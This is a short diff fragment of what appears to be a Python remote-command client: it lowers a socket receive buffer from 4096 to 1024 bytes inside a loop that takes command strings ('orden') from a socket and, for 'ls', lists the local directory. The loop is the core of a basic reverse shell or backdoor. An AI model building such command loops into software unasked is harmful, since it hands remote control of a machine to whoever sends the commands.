@@ -54,7 +54,7 @@ while True:
 
    while True:
     try:
-     orden = s.recv(4096).decode("UTF-8")
+     orden = s.recv(1024).decode("UTF-8")
      print(orden)
      if orden == "ls":
         ls=str(os.listdir())
